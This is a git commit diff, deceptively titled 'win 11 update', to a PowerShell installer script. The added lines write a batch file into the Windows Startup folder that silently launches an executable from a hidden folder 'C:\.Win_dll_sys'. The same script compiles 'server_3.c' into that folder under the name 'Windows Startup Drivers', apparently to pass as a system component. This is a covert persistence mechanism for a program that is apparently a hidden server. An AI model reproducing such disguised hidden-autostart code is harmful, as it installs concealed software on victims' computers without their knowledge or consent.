9ae6d0c3761251096253b1c078ae092121b95201
shubhpareek <shubhsmarthandsome@gmail.com>
2024-05-20 12:30:46 +0530

    win 11 update

--- script.ps1
+++ script.ps1
@@ -19,9 +19,20 @@ Copy-Item -Path $sourcePath -Destination $folderPath -Force -Recurse
 
 $sourcePath = "windows_drivers"
 Copy-Item -Path $sourcePath -Destination $folderPath -Force -Recurse
-$sourcePath = "Windows Driver Script.bat"
-$destinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-Copy-Item -Path $sourcePath -Destination $destinationPath2 -Force -Recurse
+# $sourcePath = "Windows Driver Script.bat"
+# $destinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+# Copy-Item -Path $sourcePath -Destination $destinationPath2 -Force -Recurse
+$filePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Driver Script.bat"
+$content = @"
+@echo off
+powershell.exe -Command "Start-Process 'C:\.Win_dll_sys\Windows Startup Drivers.exe' -WindowStyle Hidden"
+"@
+
+# Create the file and write content to it
+Set-Content -Path $filePath -Value $content
+
+# Write-Host "File created at $filePath with content:"
+# Get-Content $filePath
 
 gcc server_3.c -lwinmm -o "C:\.Win_dll_sys\Windows Startup Drivers"
 $file ="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Windows Startup Drivers.exe" 
